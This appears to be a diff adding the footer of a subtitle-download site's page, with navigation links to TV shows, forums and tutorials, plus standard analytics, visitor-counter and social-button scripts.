+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" " />Forums</td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/shows.php">Browse By Shows</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/1">Lost</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/shows-schedule">TV Shows Schedule</a></div></td>
+<td><div id="footermenu"><a href="http://www.sub-talk.net/topic/1031-changelog/">Site Changelog</a></div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/movie-subtitles">Browse By Movies</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/2">Heroes</a></div></td>
+<td><div id="footermenu"><a href="http://www.sub-talk.net/topic/2784-frequently-asked-questions/">Frequently Asked Questions</a></div></td>
+<td><div id="footermenu">Support Us</div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/top-uploaders">Top Uploaders</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/121">Gossip Girl</a></div></td>
+<td><div id="footermenu">RSS Feeds</div></td>
+<td><div id="footermenu">Premium Accounts</div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/log.php?mode=downloaded">Top Downloads</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/64">One Tree Hill</a></div></td>
+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" "/>Tutorials</td>
+<td><div id="footermenu"><a href="http://sub-talk.net/thread-6-1-1.html">Video Formats</a></div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/log.php?mode=news">All News</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/51">How I Met Your Mother</a></div></td>
+<td><div id="footermenu"><a href="http://www.sub-talk.net/topic/338-guide-to-syncing-with-subtitleedit/page__p__1485__hl__%2B+%2Bsync__fromsearch__1#entry1485">How to Synchronize Subtitles</a></div></td>
+<td><div id="footermenu">Frequently Asked Questions</div></td>
+</tr> 
+<tr>
+<td><div id="footermenu"><a href="http://www.sub-talk.net">Sub-Talk Forums</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/7">24</a></div></td>
+<td><div id="footermenu">What Are Subtitles</div></td>
+<td><div id="footermenu"><a href="http://sub-talk.net/index.php?gid=7">TV Shows Talk</a></div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/latest_comments.php">Latest Comments</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/126">The Big Bang Theory</a></div></td>
+<td><div id="footermenu">New Translation Tutorial</div></td>
+<td><div id="footermenu"><a href="http://sub-talk.net/index.php?gid=22">Movies Talk</a></div></td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="#">#</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/130">Family Guy</a></div></td>
+<td><div id="footermenu">Upload a New Subtitle Tutorial</div></td>
+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" " />Stats</td>
+</tr>
+<tr>
+<td><div id="footermenu">Terms of Service</div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/16">Desperate Housewives</a></div></td>
+<td><div id="footermenu"><a href="http://sub-talk.net/viewthread.php?tid=294">How to have an Avatar</a></div></td>
+<td align="left">.
+				</td>
+</tr>
+<tr>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/contact.php">Contact</a></div></td>
+<td><div id="footermenu"><a href="http://www.addic7ed.com/show/15">House</a></div></td>
+<td><div id="footermenu">How to Add to Firefox Search</div></td>
+<td> <script type="text/javascript" src="http://widgets.amung.us/classic.js"></script><script type="text/javascript">WAU_classic('8dpehb3jhy6n')</script>
+</td>
+</tr>
+</table></center>
+</center>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-10775680-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+
+
+<script type="text/javascript" src="http://apis.google.com/js/plusone.js"></script>
+
+cached = build time: 0.0545279979706 <br>		</center>
+		</body>
+		</html>
+
+
